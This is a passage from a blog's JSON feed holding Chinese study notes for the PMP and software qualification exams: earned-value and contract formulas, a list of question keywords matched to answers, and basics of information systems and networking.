= EV - AC</p>\n</div>\n<div><p>SPI（进度绩效指数）</p>\n<p>SPI = EV / PV</p>\n</div>\n<div><p>CPI（成本绩效指数）</p>\n<p>CPI = EV / AC</p>\n</div>\n<div><p>EAC（成本估算）</p>\n<p>EAC = AC + ETC</p>\n</div>\n<div><p>EAC（典型偏差）</p>\n<p>EAC = AC + (BAC - EV) / CPI = BAC / CPI</p>\n</div>\n<div><p>EAC（非典型偏差）</p>\n<p>EAC = AC + (BAC - EV) / 1 = AC + BAC - EV</p>\n</div>\n<div><p>EAC（进度成本同时作用, 成本超支或进度落后）</p>\n<p>EAC = AC + (BAC - EV) / (CPI * SPI)</p>\n</div>\n<div><p>剩余资金</p>\n<p>剩余资金 =&gt; EAC - AC</p>\n</div>\n<div><p>剩余资金</p>\n<p>剩余工作 =&gt; EAC - EV</p>\n</div>\n<div><p>TCPI（完工尚需绩效指数）</p>\n<p>TCPI = (BAC - EV) / (BAC - AC)</p>\n</div>\n<div><p>VAC（完工偏差）</p>\n<p>VAC = BAC - EAC</p>\n</div>\n<h2 id=\"第八章-质量管理\" tabindex=\"-1\"> 第八章 质量管理</h2>\n<div><p>控制范围</p>\n<p>+- 3 西格玛</p>\n</div>\n<h2 id=\"第十章-沟通管理\" tabindex=\"-1\"> 第十章 沟通管理</h2>\n<div><p>沟通渠道</p>\n<p>沟通渠道 = n(n-1)/2</p>\n</div>\n<h2 id=\"第十二章-项目采购管理\" tabindex=\"-1\"> 第十二章 项目采购管理</h2>\n<div><p>总价+激励（FPIF）</p>\n<p>总价 = 实际成本 + 目标利润 +（目标成本 - 实际成本）* 卖方应承担比例</p>\n<p>先算总价, 和最高限价比较, 计算最终总价。</p>\n<p>实际利润 = 最终总价 - 实际成本</p>\n</div>\n<div><p>成本+激励（CPIF）</p>\n<p>利润 = 目标利润 + （目标成本 - 实际成本）* 卖方应承担比例</p>\n<p>先算利润, 和利润上下限比, 计算最终利润</p>\n<p>实际总价 = 最终利润 + 实际成本</p>\n</div>\n<div><p>成本——固定费用（CPFF）</p>\n<p>实际总价 = 实际成本 + 初始成本百分比</p>\n</div>\n",
      "date_published": "2022-07-20T22:20:00.000Z",
      "date_modified": "2022-08-30T01:41:28.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "PMP"
      ]
    },
    {
      "title": "PMP 关键词篇",
      "url": "https://vxhly.github.io/pmp/examination/keyword.html",
      "id": "https://vxhly.github.io/pmp/examination/keyword.html",
      "summary": "前言\nPMP 考试题目中如果出现某些关键词, 就可以直接根据关键词选出对应的正确\n答案, 不光提高答题速度, 也能确保答题的准确率。现在将考试中一些常见关键\n词对应的正确选项列举如下。\n\n",
      "content_html": "<div><p>前言</p>\n<p>PMP 考试题目中如果出现某些关键词, 就可以直接根据关键词选出对应的正确\n答案, 不光提高答题速度, 也能确保答题的准确率。现在将考试中一些常见关键\n词对应的正确选项列举如下。</p>\n</div>\n\n<h2 id=\"第一章-引论\" tabindex=\"-1\"> 第一章 引论</h2>\n<ol>\n<li>看到“驱动变革” =====&gt; 选项中找“将来状态”</li>\n<li>看到“依赖关系” =====&gt; 选项中找“项目集管理”</li>\n<li>看到“价值最大化”、“与组织目标保持一致” =====&gt; 选项中找“项目组合管理”</li>\n<li>看到“可行性研究” =====&gt; 选项中找“商业论证”</li>\n<li>看到“长期目标” =====&gt; 选项中找“战略规划”</li>\n</ol>\n<h2 id=\"第二章-项目运行环境\" tabindex=\"-1\"> 第二章 项目运行环境</h2>\n<ol>\n<li>看到“框架”、“功能”、“过程” =====&gt; 选项中找“项目治理”</li>\n<li>看到“全部权力” =====&gt; 选项中找“项目型”</li>\n<li>看到“比较大的权力” =====&gt; 选项中找“强矩阵”</li>\n<li>看到“很小的权力” =====&gt; 选项中找“弱矩阵”</li>\n<li>看到“公司有过类似项” =====&gt; 选项中找“组织过程资产”、“经验教训”</li>\n<li>看到“顾问角色” =====&gt; 选项中找“支持型”</li>\n<li>看到“要求服从” =====&gt; 选项中找“控制型”</li>\n<li>看到“直接管理和控制” =====&gt; 选项中找“指令型”</li>\n</ol>\n<h2 id=\"第三章-项目经理的角色\" tabindex=\"-1\"> 第三章 项目经理的角色</h2>\n<ol>\n<li>看到“允许自主决策” =====&gt; 选项中找“放任型”</li>\n<li>看到“给予奖励”、“例外管理” =====&gt; 选项中找“交易型”</li>\n<li>看到“服务承诺”、“关注他人” =====&gt; 选项中找“服务型”</li>\n<li>看到“促进创新” =====&gt; 选项中找“变革型”</li>\n<li>看到“激励他人”、“自信”、“说服力强” =====&gt; 选项中找“魅力型”</li>\n</ol>\n<h2 id=\"第四章-项目整合管理\" tabindex=\"-1\"> 第四章 项目整合管理</h2>\n<ol>\n<li>题目中出现“新任项目经理”、“项目经理权力责任” =====&gt; 选项中找“项目章程”</li>\n<li>看到“是否值得投资” =====&gt; 选项中找“商业论证”</li>\n<li>看到制约因素(或假设条件) =====&gt; 选项中找 “假设日志”</li>\n<li>看到“纠正措施、预防措施、缺陷补救、更新” =====&gt; 选项中找“变更请求”</li>\n<li>看到“计划制定完成”、“章程制定完成” =====&gt; 选项中找“批准”</li>\n<li>看到“版本问题” =====&gt; 选项中找“配置管理”</li>\n<li>看到“新任项目经理” =====&gt; 选项中找“项目章程”</li>\n<li>看到“项目完成”或“终止” =====&gt; 选项中找“经验教训”</li>\n<li>看到“某某人很有经验” =====&gt; 选项中找“专家判断”</li>\n<li>看到“考虑所有意见”、“既定决策流程” =====&gt; 选项中找“引导”</li>\n<li>看到“分享知识” =====&gt; 选项中找“信息管理</li>\n</ol>\n<h2 id=\"第五章-项目范围管理\" tabindex=\"-1\"> 第五章 项目范围管理</h2>\n<ol>\n<li>看到“暂时无法分解”、“信息不完整” =====&gt; 选项中找“滚动式规划”</li>\n<li>看到“除外责任”、“范围边界”、“可交付成果的详细描述” =====&gt; 选项中找“项目范围说明书”</li>\n<li>看到“需求(意见)不一致” =====&gt; 选项中找“引导式研讨会”</li>\n<li>看到“一对一”、“获取机密信息” =====&gt; 选项中找“访谈”</li>\n<li>看到“了解期望和态度” =====&gt; 选项中找“焦点小组”</li>\n<li>看到“受众多样”、“快速完成”、“地理位置分散”、“适合开展统计分析” =====&gt; 选项中找“问卷调查”</li>\n<li>看到“最佳实践” =====&gt; 选项中找“标杆对照”</li>\n<li>看到“超过 50%” =====&gt; 选项中找“大多数同意”</li>\n<li>看到“候选项超过 2 个以上” =====&gt; 选项中找“相对多数同意”</li>\n<li>看到“创意分组” =====&gt; 选项中找“亲和图”</li>\n<li>看到“创意整合”、“反应共性和差异”、“激发新创意” =====&gt; 选项中找“思维导图”</li>\n<li>看到“投票排列”、“优先排序” =====&gt; 选项中找“名义小组技术”</li>\n<li>看到“更早发现并更快解决问题” =====&gt; 选项中找“引导”</li>\n<li>看到“业务目标” =====&gt; 选项中找“需求跟踪矩阵”</li>\n<li>看到“产生项目可交付成果的具体活动” =====&gt; 选项中找“里程碑清单”</li>\n</ol>\n<h2 id=\"第六章-项目进度管理\" tabindex=\"-1\"> 第六章 项目进度管理</h2>\n<ol>\n<li>看到“活动之间的依赖关系” =====&gt; 选项中找“网络图”</li>\n<li>看到“进度灵活性” =====&gt; 选项中找“关键路径法”</li>\n<li>看到“活动延期” =====&gt; 选项中找“关键活动”</li>\n<li>看到“负的总时差” =====&gt; 选项中找“活动延期”</li>\n<li>看到“最佳实践”、“快速跟进” =====&gt; 选项中找“选择性依赖关系”</li>\n<li>看到“成本较低”、“耗时较少”、“准确性较低”、”最快“ =====&gt; 选项中找“类比估算”</li>\n<li>看到“历史数据之间统计关系”、“数据库”、“模型”、”PERT“ =====&gt; 选项中找“参数估算”</li>\n<li>看到“资源有限”、“过度分配”、“关键路径改变”、“使用关键路径法分析” =====&gt; 选项中找“资源平衡”</li>\n<li>看到“无法实现资源优化”、“不改变关键路径” =====&gt; 选项中找“资源平滑”</li>\n<li>看到“不同条件下的可行性” =====&gt; 选项中找“假设情景分析”</li>\n<li>看到“模型化”、“计算整个项目可能的进度结果” =====&gt; 选项中找“模拟”</li>\n<li>看到“加班”、“增加额外资源”、“最小的成本增加”、“不计成本地缩短关键路径” =====&gt; 选项中找“赶工”</li>\n<li>看到“并行开展”、“没有额外的资源”、“成本不能超支” =====&gt; 选项中找“快速跟进”</li>\n<li>看到“向管理层汇报” =====&gt; 选项中找“横道图、甘特图”</li>\n<li>看到“最悲观、最乐观、最可能” =====&gt; 选项中找“PERT 技术”</li>\n<li>看到“没有合理可信度”、“提供准确估算”、“最准确的时间估算“ =====&gt; 选项中找“自下而上估算”</li>\n<li>看到“理解目前的绩效”、“与未来绩效进行对比” =====&gt; 选项中找“趋势分析”</li>\n<li>看到“保持约定的项目进度基准” =====&gt; 选项中找“关键路径上的活动”</li>\n<li>看到“进度落后” =====&gt; 选项中找”进度压缩“ &gt; ”赶工“ &gt; ”快速跟进“</li>\n<li>看到“可交付成果的文件” =====&gt; 选项中找“里程碑图”</li>\n</ol>\n<h2 id=\"第七章-项目成本管理\" tabindex=\"-1\"> 第七章 项目成本管理</h2>\n<ol>\n<li>看到“已知的未知风险” =====&gt; 选项中找“应急储备”</li>\n<li>看到“未知的未知风险”、“额外” =====&gt; 选项中找“管理储备”</li>\n<li>看到“外部资金” =====&gt; 选项中找“融资”</li>\n<li>看到“进度绩效指数” =====&gt; 选项中找“分析关键路径上的绩效”</li>\n<li>看到“成本控制” =====&gt; 选项中找“维护成本基准”</li>\n<li>看到“资深项目经理”、“以往类似项目” =====&gt; 选项中找“专家判断”</li>\n</ol>\n<h2 id=\"第八章-项目质量管理\" tabindex=\"-1\"> 第八章 项目质量管理</h2>\n<ol>\n<li>看到“确保”, “防止” =====&gt; 选项中找“管理质量”</li>\n<li>看到“改进过程、识别潜在缺陷、估算质量成本” =====&gt; 选项中找“流程图”</li>\n<li>看到“根本原因” =====&gt; 选项中找“因果图、石川图、鱼骨图、why-why 分析图”</li>\n<li>看到“两个因素的关系” =====&gt; 选项中找“散点图”</li>\n<li>看到“上下限”、“限值”、“过程的稳定性”、“具有可预测的绩效” =====&gt; 选项中找“控制图”</li>\n<li>看到“主要问题、主要缺陷、给缺陷排序”、“二八定律” =====&gt; 选项中找“帕累托图”</li>\n<li>看到“缺陷被识别记录” =====&gt; 选项中找“核查表“、“计数表”</li>\n<li>看到“增值活动”、“非增值活动” =====&gt; 选项中找“过程改进”、“管理质量”</li>\n<li>看到“质量测量方法” =====&gt; 选项中找“质量测量指标”</li>\n<li>看到“检查可交付成果” =====&gt; 选项中找“质量控制”</li>\n<li>看到“识别最佳实践”、“识别违规”、“改进过程执行” =====&gt; 选项中找“管理质量”、“审计”</li>\n<li>看到“培训”、“测试”、“破坏性试验”、“检查” =====&gt; 选项中找“一致性成本”</li>\n<li>看到“返工”、“报废”、“保修” =====&gt; 选项中找“非一致性成本”</li>\n<li>看到“价值链”、“过程流” =====&gt; 选项中找“流程图”</li>\n<li>看到“频率” =====&gt; 选项中找“直方图”</li>\n<li>看到“可视化”、“数据完整性” =====&gt; 选项中找“逻辑数据模型”</li>\n<li>看到“因素的数量”、“关系强弱” =====&gt; 选项中找“矩阵图”</li>\n<li>看到“提高产品特性” =====&gt; 选项中找“面向 X 的设计”</li>\n<li>看到“六西格玛”、“PDCA” =====&gt; 选项中找“质量改进方法”</li>\n<li>看到“核查表” =====&gt; 选项中找“识别缺陷”</li>\n<li>看到“发现缺陷” =====&gt; 选项中找“控制质量”、“检查”</li>\n</ol>\n<h2 id=\"第九章-项目资源管理\" tabindex=\"-1\"> 第九章 项目资源管理</h2>\n<ol>\n<li>看到“退出”、“推迟到准备充分”、“推给其他人解决” =====&gt; 选项中找“撤退/回避”</li>\n<li>看到“强调一致性” =====&gt; 选项中找“缓解/包容”</li>\n<li>看到“一定程度满意” =====&gt; 选项中找“妥协/调解”</li>\n<li>看到“公开对话”、“达成共识” =====&gt; 选项中找“合作/解决问题”</li>\n<li>看到“解决紧急问题” =====&gt; 选项中找“强迫/命令”</li>\n<li>看到“团队成员能力不足” =====&gt; 选项中找“提供培训”</li>\n<li>看到“可接受行为” =====&gt; 选项中找“基本规则”</li>\n<li>看到“团队绩效差” =====&gt; 选项中找“识别根本原因”</li>\n<li>看到“会议有问题” =====&gt; 选项中找“团队章程”或者“基本规则”</li>\n<li>看到“内部资源不足” =====&gt; 选项中找“招募”</li>\n<li>看到“团队成员角色责任” =====&gt; 选项中找“责任分配矩阵”、“RACI”</li>\n<li>看到“资源详细描述”、“技能、等级、证书” =====&gt; 选项中找“资源分解结构”</li>\n<li>看到“早期”、“详细信息不足”、“粗略的” =====&gt; 选项中找“类比估算”</li>\n<li>看到“争吵”、“对立” =====&gt; 选项中找“震荡阶段”</li>\n<li>看到“开始建立信任” =====&gt; 选项中找“规范阶段”</li>\n<li>看到“像一个组织有序的单位” =====&gt; 选项中找“成熟阶段”</li>\n</ol>\n<h2 id=\"第十章-项目沟通管理\" tabindex=\"-1\"> 第十章 项目沟通管理</h2>\n<ol>\n<li>看到“虚拟团队” =====&gt; 选项中找“沟通管理计划”或“规划沟通”</li>\n<li>看到“实时”、“面对面” =====&gt; 选项中找“互动沟通”</li>\n<li>看到“特定群体” =====&gt; 选项中找“推式沟通”</li>\n<li>看到“大量信息”、“受众广泛” =====&gt; 选项中找“拉式沟通”</li>\n</ol>\n<h2 id=\"第十一章-项目风险管理\" tabindex=\"-1\"> 第十一章 项目风险管理</h2>\n<ol>\n<li>看到“使用全新技术或方法”、“高优先级的机会”、“最有能力的资源” =====&gt; 选项中找“开拓”</li>\n<li>看到“增加资源” =====&gt; 选项中找“提高”</li>\n<li>看到“建立应急储备”、“预留时间、资金、资源”、“定期审查” =====&gt; 选项中找“接受”</li>\n<li>看到“消除威胁的原因”、“延长进度计划”、“改变项目策略”、“缩小范围”、“拉回到临界值” =====&gt; 选项中找“规避”</li>\n<li>看到“外包”、“买保险”、“签订协议”、“成立合资企业” =====&gt; 选项中找“转移”</li>\n<li>看到“更多测试”、“加入冗余部件”、“备用” =====&gt; 选项中找“减轻”</li>\n<li>看到“最大潜在影响” =====&gt; 选项中找“敏感性分析”</li>\n<li>看到“给风险排序”、“识别主要风险” =====&gt; 选项中找“风险定性分析”</li>\n<li>看到“风险”“不确定性” =====&gt; 选项中找“三点估算”</li>\n<li>看到“风险管理过程的有效性”、“风险应对措施的有效性” =====&gt; 选项中找“风险审计”</li>\n<li>看到“如何实施风险管理活动” =====&gt; 选项中找“风险管理计划”</li>\n<li>看到“优先级排序” =====&gt; 选项中找“概率和影响矩阵”</li>\n<li>看到“优势”、“劣势” =====&gt; 选项中找“SWOT 分析”</li>\n<li>看到“协助形成想法” =====&gt; 选项中找“提示清单”</li>\n<li>看到“两个以上参数分类” =====&gt; 选项中找“层级图”</li>\n<li>看到“三角分布”、“正态分布”、“贝塔分布”、“离散分布” =====&gt; 选项中找“不确定性表现方式”</li>\n<li>看到“龙卷风图” =====&gt; 选项中找“敏感性分析”</li>\n<li>看到“最优路径” =====&gt; 选项中找“决策树分析”</li>\n</ol>\n<h2 id=\"第十二章-项目采购管理\" tabindex=\"-1\"> 第十二章 项目采购管理</h2>\n<ol>\n<li>看到“范围清楚”、“买方风险最小” =====&gt; 选项中找“固定价合同”</li>\n<li>看到“一定灵活性”、“绩效偏离”、“财务奖励”、“价格上限” =====&gt; 选项中找“总价加激励费用合同”</li>\n<li>看到“跨越时间长”、“通货膨胀” =====&gt; 选项中找“总价加经济价格调整合同”</li>\n<li>看到“人工费率”、“材料费率”、“无法快速定义 SOW” =====&gt; 选项中找“工料合同(T&amp;M)”</li>\n<li>看到考合同类型的题目中出现“利润” =====&gt; 选项中找“成本补偿合同”</li>\n<li>看到“激励费用”、“比例分担” =====&gt; 选项中找“成本加激励费用合同”</li>\n<li>看到“主观判断”、“奖励费用” =====&gt; 选项中找“成本加奖励费用合同”</li>\n<li>看到“无特别优待”、“一致的理解” =====&gt; 选项中找“投标人会议”</li>\n<li>看到“怀疑潜在卖方报价” =====&gt; 选项中找“独立成本估算”</li>\n<li>看到“复杂采购” =====&gt; 选项中找“建议书评价技术”</li>\n</ol>\n<h2 id=\"第十三章-项目相关方管理\" tabindex=\"-1\"> 第十三章 项目相关方管理</h2>\n<ol>\n<li>看到“职权级别”、“关心程度” =====&gt; 选项中找“权力利益方格”</li>\n</ol>\n",
      "date_published": "2022-07-19T22:50:00.000Z",
      "date_modified": "2022-09-04T04:22:08.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "PMP"
      ]
    },
    {
      "title": "第一章：信息化和信息系统",
      "url": "https://vxhly.github.io/soft-test/knowledge/Information-system.html",
      "id": "https://vxhly.github.io/soft-test/knowledge/Information-system.html",
      "summary": "前言\n记录信息化和信息系统章节的相关知识、频繁考点。\n\n",
      "content_html": "<div><p>前言</p>\n<p>记录信息化和信息系统章节的相关知识、频繁考点。</p>\n</div>\n\n<h2 id=\"信息系统与信息化\" tabindex=\"-1\"> 信息系统与信息化</h2>\n<p>香农指出信息是能够用来消除不确定的东西</p>\n<ul>\n<li>信息：信息是系统有序程度的度量。</li>\n<li>系统：系统是指由多个元素有机结合在一起, 执行特定的功能以达到特定目的的集合体。</li>\n<li>信息系统：信息系统就是输入数据, 通过加工处理, 产生信息的系统。是由计算机硬件、网络和通信设备、计算机软件、信息资源、信息用户和规章制度组成的以处理信息流为目的的人机一体化系统。主要有五个基本功能, 即对信息的输入、存储、处理、输出和控制。</li>\n</ul>\n<h3 id=\"信息的质量属性\" tabindex=\"-1\"> 信息的质量属性</h3>\n<ul>\n<li>精确性</li>\n<li>完整性</li>\n<li>可靠性</li>\n<li>及时性</li>\n<li>经济性</li>\n<li>可验证性</li>\n<li>安全性</li>\n<li>依附性</li>\n<li>传递性</li>\n<li>及时性</li>\n<li>动态性</li>\n</ul>\n<h3 id=\"信息的传输模型\" tabindex=\"-1\"> 信息的传输模型</h3>\n<p>信息只有流动起来才能体现其价值, 信息的传输技术是信息技术的核心。</p>\n<p>当噪声携带的信息大到一定程度的时候, 在信道中传输的信息可以被噪声掩盖导致传输失败。</p>\n<i>Content not supported</i><h3 id=\"信息化\" tabindex=\"-1\"> 信息化</h3>\n<h4 id=\"信息化从-小-到-大-的层次\" tabindex=\"-1\"> 信息化从 “小” 到 “大” 的层次</h4>\n<ul>\n<li>产品信息化</li>\n<li>企业信息化</li>\n<li>产业信息化</li>\n<li>国民经济信息化</li>\n<li>社会生活信息化</li>\n</ul>\n<p>信息化的主体是全体成员, 包括政府、企业、事业、团体和个人。</p>\n<h4 id=\"两网一站\" tabindex=\"-1\"> 两网一站</h4>\n<ul>\n<li>两网：政府内网和政府外网</li>\n<li>一站：政府门户网站</li>\n</ul>\n<h4 id=\"国家信息化体系六要素\" tabindex=\"-1\"> 国家信息化体系六要素</h4>\n<ul>\n<li>信息资源（核心任务）</li>\n<li>信息网络（基础设施）</li>\n<li>信息技术应用（龙头）</li>\n<li>信息技术和产业（物质基础）</li>\n<li>信息化人才（成功之本）</li>\n<li>信息化政策法规和标准规范（保障）</li>\n</ul>\n<h2 id=\"大型信息系统的特点\" tabindex=\"-1\"> 大型信息系统的特点</h2>\n<ul>\n<li>规模庞大 =&gt; 包含子系统甚多</li>\n<li>跨地域性 =&gt; 分布广阔, 部署不集中</li>\n<li>网络结构复杂 =&gt; 多级网络机构、跨域多个安全域、网络关系复杂、接口众多</li>\n<li>业务种类多 =&gt; 种类多、处理逻辑复杂、业务之间关联关系复杂</li>\n<li>数据量大 =&gt; 信息量大、内容多且多样</li>\n<li>用户多 =&gt; 使用者多、角色多, 系统访操作多</li>\n</ul>\n<h2 id=\"信息系统生命周期\" tabindex=\"-1\"> 信息系统生命周期</h2>\n<p>软件的生命周期包括：</p>\n<ul>\n<li>可行性分析与项目开发计划</li>\n<li>需求分析</li>\n<li>概要设计</li>\n<li>详细设计</li>\n<li>编码</li>\n<li>测试</li>\n<li>运维等阶段</li>\n</ul>\n<p>信息系统的生命周期：</p>\n<ul>\n<li>【系统规划阶段】（可行性分析与项目开发计划）=&gt; 立项阶段 ==&gt; 输出文书：可行性研究报告、系统设计任务书\n<ul>\n<li>对组织的环境、目标及现行系统的状况进行初步调查, 根据组织目标和发展战略, 确定信息系统的发展战略</li>\n</ul>\n</li>\n<li>【系统分析阶段】（需求分析）=&gt; 开发阶段 ==&gt; 输出文书：系统说明书\n<ul>\n<li>根据系统设计任务书所确定的范围, 对现行系统进行详细调查, 描述现行系统的业务流程, 指出现行系统的局限性和不足之处, 提出新系统的逻辑模型</li>\n</ul>\n</li>\n<li>【系统设计阶段】（概要设计、详细设计）=&gt; 开发阶段 ==&gt; 输出文书：系统设计说明书\n<ul>\n<li>根据系统说明书规定的功能需求, 考虑实际条件, 具体设计实现逻辑模型的技术方案, 也技术设计新系统的物理模型</li>\n</ul>\n</li>\n<li>【系统实施阶段】（编码、测试）=&gt; 开发阶段 ==&gt; 输出文书：实施进展报告、系统测试分析报告\n<ul>\n<li>是将设计的系统付诸实施的阶段, 包括计算机等设备的购置、安装和调试、程序的编写和调试、人员培训、数据文件转换、系统调试与转换等</li>\n</ul>\n</li>\n<li>【系统运行和维护阶段】（运维）=&gt; 运维及消亡阶段\n<ul>\n<li>记录系统运行的情况, 根据一定的规则对系统进行必要的修改, 评价系统的工作质量和经济效益</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"信息系统的开发方法\" tabindex=\"-1\"> 信息系统的开发方法</h2>\n<h3 id=\"结构化方法\" tabindex=\"-1\"> 结构化方法</h3>\n<p>自顶向下、逐步求精和模块化设计。</p>\n<p>主要特点：</p>\n<p>（1）开发目标清晰化\n（2）开发工作阶段化\n（3）开发文档规范化\n（4）设计方法结构化</p>\n<p>不足和局限性：</p>\n<p>（1）开发周期长\n（2）难以适应需求变化\n（3）很少考虑数据结构</p>\n<h3 id=\"面向对象方法\" tabindex=\"-1\"> 面向对象方法</h3>\n<p>使用结构化方法进行自顶向下的整体划分, 自底向上使用面向对象方法进行开发。</p>\n<p>面向对象的方法构建在类和对象之上, 通过建模技术将相关对象按照业务进行分组, 形成构件。</p>\n<ul>\n<li>【消息】体现对象间的交互, 通过它向目标对象发出操作请求</li>\n<li>【继承】</li>\n<li>【多态】</li>\n<li>【接口】</li>\n</ul>\n<p>主要特点：</p>\n<p>（1）封装性\n（2）抽象性\n（3）继承性\n（4）动态链接性</p>\n<p>不足和局限性：</p>\n<p>（1）在大型项目的开发上具有一定的局限性\n（2）不能涉足系统分析前的开发环节</p>\n<h3 id=\"原型化方法\" tabindex=\"-1\"> 原型化方法</h3>\n<p>利用系统开发工具, 快速建立一个系统模型展示给用户</p>\n<p>主要特点：</p>\n<ul>\n<li>使系统开发的周期缩短、成本和风险降低、速度加快</li>\n<li>以用户为中心来开发系统, 用户参与度大大提高, 增加用户的满意度, 提高系统开发的成功率</li>\n<li>由于用户参与了系统开发的全过程, 对系统的功能和结构容易理解和接受, 有利于系统的移交, 有利于系统的运行与维护</li>\n</ul>\n<p>不足和局限性：</p>\n<ul>\n<li>开发的环境要求高</li>\n<li>管理水平要求高</li>\n</ul>\n<h3 id=\"面向服务方法\" tabindex=\"-1\"> 面向服务方法</h3>\n<p>使信息系统快速响应需求与环境变化, 提高系统可复用性、信息资源共享和系统之间的互操作性, 成为影响信息化建设效率的关键问题。</p>\n<p>主要特点：</p>\n<p>（1）重用性\n（2）注重效率\n（3）松耦合\n（4）职责划分</p>\n<p>不足和局限性：</p>\n<p>（1）代码冗余\n（2）成本高</p>\n<h2 id=\"常规信息系统集成技术\" tabindex=\"-1\"> 常规信息系统集成技术</h2>\n<h3 id=\"osi-七层模型-开放系统互连参考模型\" tabindex=\"-1\"> OSI 七层模型（开放系统互连参考模型）</h3>\n<ul>\n<li>物理层 =&gt; 协议：RJ-45、V.35、RS232、FDDI\n<ul>\n<li>包括物理联网媒介</li>\n</ul>\n</li>\n<li>数据链路层 =&gt; 协议：IEEE 802.3/.2、HDLC、PPP、ATM\n<ul>\n<li>控制网络层与物理层之间的联系</li>\n</ul>\n</li>\n<li>网络层 =&gt; 协议：IP、ICMP、IGMP、ARP、IPX\n<ul>\n<li>将网络地址翻译成队员的物理地址</li>\n</ul>\n</li>\n<li>传输层 =&gt; 协议：TCP、UDP、SPX\n<ul>\n<li>负责确保数据可靠、顺序、无错的从 A 点传输到 B 点</li>\n</ul>\n</li>\n<li>会话层 =&gt; 协议：SQL、NFS、RPC\n<ul>\n<li>负责在网络中两节点之间建立和维持通信, 以及提供交互会话的管理功能</li>\n</ul>\n</li>\n<li>表示层 =&gt; 协议：JPEG、ASCLL、GIF、DES、MPEG\n<ul>\n<li>如同应用程序和网络之间的翻译官</li>\n</ul>\n</li>\n<li>应用层 =&gt; 协议：HTTP、Telnet、FTP、SMTP\n<ul>\n<li>负责对软件提供接口以便程序能够使用网络服务</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"tcp-ip-四层模型\" tabindex=\"-1\"> TCP/IP 四层模型</h3>\n<ul>\n<li>应用层（应用层、表示层、会话层）</li>\n<li>传输层（传输层）</li>\n<li>网络层（网络层）</li>\n<li>网络接口层（物理层、数据链路层）</li>\n</ul>\n<h3 id=\"协议\" tabindex=\"-1\"> 协议</h3>\n<ul>\n<li>TCP =&gt; 可靠的、面向连接的</li>\n<li>UDP =&gt; 不可靠的、无连接的</li>\n<li>FTP、HTTP、Telnet、SMTP =&gt; 建立在 TCP 基础之上</li>\n<li>TFTP、DNS、DHCP、SNMP =&gt; 建立在 UDP 基础之上</li>\n</ul>\n<h3 id=\"网络设备\" tabindex=\"-1\"> 网络设备</h3>\n<table>\n<thead>\n<tr>\n<th>互联设备</th>\n<th>工作层次</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>中继器</td>\n<td>物理层</td>\n</tr>\n<tr>\n<td>网桥</td>\n<td>数据链路层</td>\n</tr>\n<tr>\n<td>路由器</td>\n<td>网络层</td>\n</tr>\n<tr>\n<td>网关</td>\n<td>高层（第 4 ～ 7 层）</td>\n</tr>\n<tr>\n<td>集线器</td>\n<td>物理层</td>\n</tr>\n<tr>\n<td>二层交换机</td>\n<td>数据链路层</td>\n</tr>\n<tr>\n<td>三层交换机</td>\n<td>网络层</td>\n</tr>\n<tr>\n<td>多层交换机</td>\n<td>高层（第 4 ～ 7 层）</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"网络存储技术\" tabindex=\"-1\"> 网络存储技术</h3>\n<ul>\n<li>DAS（直接附加存储）=&gt; 直接与主机系统相连, 很难扩展、传递距离、连接数量、传输速率等方面都受到限制</li>\n<li>NAS（网络附加存储）=&gt; 直接与网络介质相连, 需要通过数据网关来访问 NAS, 响应速度快、数据传输速率高, 即插即用</li>\n<li>SAN（存储区域网络）=&gt; 管理方便、扩展容易、具有无限的可扩展能力</li>\n</ul>\n<h3 id=\"网络接入技术\" tabindex=\"-1\"> 网络接入技术</h3>\n<h3 id=\"有线接入方式\" tabindex=\"-1\"> 有线接入方式</h3>\n<p>（1）PSTN\n（2）ISDN\n（3）ADSL\n（4）FTTx+LAN\n（5）HFC</p>\n<h4 id=\"无线接入方式\" tabindex=\"-1\"> 无线接入方式</h4>\n<p>（1）GPRS\n（2）Wifi\n（3）3G、4G、5G</p>\n<h3 id=\"网络规划与设计\" tabindex=\"-1\"> 网络规划与设计</h3>\n<h4 id=\"网络设计工作\" tabindex=\"-1\"> 网络设计工作</h4>\n<ul>\n<li>网络拓扑结构设计</li>\n<li>主干网络（核心层）设计</li>\n<li>汇聚层和接入层设计</li>\n<li>广域网连接与远程访问设计</li>\n<li>无线网络设计</li>\n<li>网络安全设计</li>\n<li>设备选型</li>\n</ul>\n<h4 id=\"信息安全的基本要素\" tabindex=\"-1\"> 信息安全的基本要素</h4>\n<ul>\n<li>机密性：确保信息不暴露给未授权的实体或进程</li>\n<li>完整性：只有得到允许的人才能修改数据, 并且能够判别出数据是否已被篡改</li>\n<li>可用性：得到授权的实体在需要时可访问数据, 即攻击者不能占用所有的资源而阻碍授权者的工作</li>\n<li>可控性：可以控制授权范围内的信息流向以及行为方式</li>\n<li>可审查性：对出现的网络安全问题提供调查的依据和手段</li>\n</ul>\n<h3 id=\"数据库管理系统\" tabindex=\"-1\"> 数据库管理系统</h3>\n<ul>\n<li>Oracle =&gt; 关系型数据库</li>\n<li>MySQL =&gt; 关系型数据库</li>\n<li>SQLServer =&gt; 关系型数据库</li>\n<li>mongoDB =&gt; 非关系型数据库</li>\n</ul>\n<h3 id=\"数据仓库\" tabindex=\"-1\"> 数据仓库</h3>\n<p>数据仓库是一个面向主题的、集成的、非易失的、且随时间变化的数据集合, 用于支持管理决策。</p>\n<p>体系结构的 4 个层次</p>\n<p>（1）数据源\n（2）数据的存储与管理\n（3）OLAP 服务器（联机分析处理）\n（4）前端工具</p>\n<h3 id=\"中间件技术\" tabindex=\"-1\"> 中间件技术</h3>\n<p>中间件的分类：</p>\n<ul>\n<li>底层型中间件 =&gt; JVM（Java 虚拟机）、CLR（公共语言运行库）、ACE（自适应通信环境）、JDBC（数据库连接）、ODBC（开放数据库互连）</li>\n<li>通用型中间件 =&gt; CORBA（公共对象请求代理体系结构）、J2EE、MOM（面向消息的中间件）、COM</li>\n<li>集成型中间件 =&gt; WorkFlow、EAI（企业应用集成）</li>\n</ul>\n<p>为了完成不同层次的集成, 可以采用的技术、产品：</p>\n<ul>\n<li>为了完成系统底层传输层的集成, 可以采用 CORBA（公共对象请求代理体系结构）技术</li>\n<li>为了完成不同系统的信息传递, 可以采用消息中间件产品</li>\n<li>为了完成不同硬件和操作系统的集成, 可以采用 J2EE 中间件产品</li>\n</ul>\n<h3 id=\"高可用性和高可靠性的规划与设计\" 